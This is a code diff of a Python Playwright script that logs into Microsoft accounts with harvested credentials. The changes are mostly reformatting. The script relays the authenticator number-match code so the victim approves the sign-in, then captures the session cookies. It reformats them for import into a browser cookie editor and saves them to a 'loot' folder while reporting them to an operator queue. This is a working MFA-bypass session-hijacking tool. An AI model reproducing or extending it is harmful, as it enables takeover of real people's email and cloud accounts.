@@ -1,24 +1,21 @@
-import re
-from playwright.sync_api import Playwright, sync_playwright, expect
+from playwright.sync_api import Playwright, sync_playwright
 import time
 import json
-import os 
-import pickle
+import os
 
 try:
     import sys
 
     sys.path.insert(0, "..")
-    from utils import messageAdmin, DEBUG
-except:
-    pass
+except Exception as e:
+    print(e)
 try:
     import sys
 
     sys.path.insert(0, "..")
-    import test
-except:
-    pass
+except Exception as e:
+    print(e)
+
 
 # def send_message(self, msg,type="slack", data=""):
 #         # print(f"[+] current Stat: {msg} : {data}")
@@ -43,16 +40,24 @@ class auto_login:
         self.cookie = None
         if not os.path.exists(self.loot_location):
             os.makedirs(self.loot_location)
-    
-    def send_message(self, msg,type="noti", data=""):
+
+    def send_message(self, msg, type="noti", data=""):
         if self.last_admin_msg == msg:
             return
         self.last_admin_msg = msg
-        curr_msg = json.dumps({"id": self.id,"username":self.username, "type":type ,"msg": msg, "data": data})
+        curr_msg = json.dumps(
+            {
+                "id": self.id,
+                "username": self.username,
+                "type": type,
+                "msg": msg,
+                "data": data,
+            }
+        )
         print(curr_msg)
         self.q.put(curr_msg)
 
-    def fix_cookie(self,cookie):
+    def fix_cookie(self, cookie):
         final_lst = []
         Cookie_editor_json_template = {
             "path": "",
@@ -68,29 +73,33 @@ class auto_login:
             Cookie_editor_json = dict(Cookie_editor_json_template)
             Cookie_editor_json["path"] = line["path"]
             Cookie_editor_json["domain"] = line["domain"]
-            Cookie_editor_json["expirationDate"] = int(time.time()) + (60*60*24*30)
+            Cookie_editor_json["expirationDate"] = int(time.time()) + (
+                60 * 60 * 24 * 30
+            )
             Cookie_editor_json["name"] = line["name"]
             Cookie_editor_json["httpOnly"] = line["httpOnly"]
             Cookie_editor_json["value"] = line["value"]
             Cookie_editor_json["secure"] = False
-        
-            if Cookie_editor_json["name"].startswith("__Host") or Cookie_editor_json["name"].startswith("__Secure-"):
+
+            if Cookie_editor_json["name"].startswith("__Host") or Cookie_editor_json[
+                "name"
+            ].startswith("__Secure-"):
                 Cookie_editor_json["secure"] = True
-            
+
             if Cookie_editor_json["domain"][0] == ".":
                 Cookie_editor_json["hostOnly"] = False
                 Cookie_editor_json["domain"] = Cookie_editor_json["domain"][1:]
             else:
                 Cookie_editor_json["hostOnly"] = True
-            
+
             if Cookie_editor_json["path"] == "":
                 Cookie_editor_json["path"] = "/"
 
             final_lst.append(Cookie_editor_json)
-        
+
         return json.dumps(final_lst)
 
-    def run(self,playwright: Playwright) -> None:
+    def run(self, playwright: Playwright) -> None:
         browser = playwright.chromium.launch(headless=True)
         context = browser.new_context()
         page = context.new_page()
@@ -99,7 +108,10 @@ class auto_login:
         page.get_by_placeholder("Email, phone, or Skype").fill(self.username)
         page.get_by_role("button", name="Next").click()
         page.wait_for_timeout(3000)
-        if "We couldn't find an account with that username" in page.content() or "This username may be incorrect" in page.content():
+        if (
+            "We couldn't find an account with that username" in page.content()
+            or "This username may be incorrect" in page.content()
+        ):
             self.send_message("Invalid username")
             return
 
@@ -112,41 +124,41 @@ class auto_login:
             return
 
         self.send_message("valid creds")
-        
+
         # check if OTP present:
-        
+
         # if "Open your Authenticator app, and enter the number shown to sign in" in page.content():
         #     # Get the OTP
         #     self.OTP = page.locator("#idRichContext_DisplaySign").text_content()
         #     self.send_message(msg="OTP_code", data=self.OTP)
-            
-            # Waiting for an action to happen
+
+        # Waiting for an action to happen
         OTP_wait_time = 120
         while True:
-            if OTP_wait_time == 0 :
+            if OTP_wait_time == 0:
                 self.send_message("reached_max_waiting, continuing just in case")
                 page.screenshot(path=f"{self.loot_location}/last_screen.png")
                 # context.close()
                 # browser.close()
                 # return
                 break
-            
-            OTP_wait_time -=1 
+
+            OTP_wait_time -= 1
             time.sleep(1)
             curr_time = time.time()
-            # wait for 20 second max for the page to load 
+            # wait for 20 second max for the page to load
             while time.time() - curr_time < 20:
-                # Yes this is the best solution that i con think of for this error :) 
+                # Yes this is the best solution that i con think of for this error :)
                 # Page.content: Unable to retrieve content because the page is navigating and changing the content.
                 try:
                     page_content = page.content()
                     break
-                except :
+                except Exception as _:
                     time.sleep(1)
-            
+
             if "Stay signed in?" in page_content:
                 # an extra wait to for the button to become clickable
-                time.sleep(2) 
+                time.sleep(2)
                 page.locator("#idSIButton9").click()
                 self.send_message("OTP_submited_stay_signedin_clicked")
                 break
@@ -167,7 +179,7 @@ class auto_login:
                 page.screenshot(path=f"{self.loot_location}/verify_screen.png")
                 locators = [
                     'xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div/div',
-                    'xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div[1]/div'
+                    'xpath=//*[@id="idDiv_SAOTCS_Proofs"]/div[1]/div',
                 ]
                 for locator in locators:
                     try:
@@ -176,7 +188,6 @@ class auto_login:
                     except Exception:
                         continue
 
-                
             elif "Open your Authenticator app" in page.content():
                 # Get the OTP
                 self.OTP = page.locator("#idRichContext_DisplaySign").text_content()
@@ -192,7 +203,7 @@ class auto_login:
         self.send_message("Getting cookies")
         self.cookie = self.fix_cookie(context.cookies())
         print(self.cookie)
-        self.send_message(msg="cookies",type="internal",data=self.cookie)
+        self.send_message(msg="cookies", type="internal", data=self.cookie)
         with open(f"{self.loot_location}/cookies.json", "wb") as f:
             f.write(self.cookie.encode())
 
@@ -209,7 +220,6 @@ class auto_login:
         page.wait_for_timeout(15000)
         page.screenshot(path=f"{self.loot_location}/outlook.png")
 
-
         page.wait_for_timeout(40000)
 
         # ---------------------
@@ -223,5 +233,5 @@ class auto_login:
 
 
 if __name__ == "__main__":
-    obj = auto_login(1,"1","a@test.com","bbb")
+    obj = auto_login(1, "1", "a@test.com", "bbb")
     obj.start_the_action()
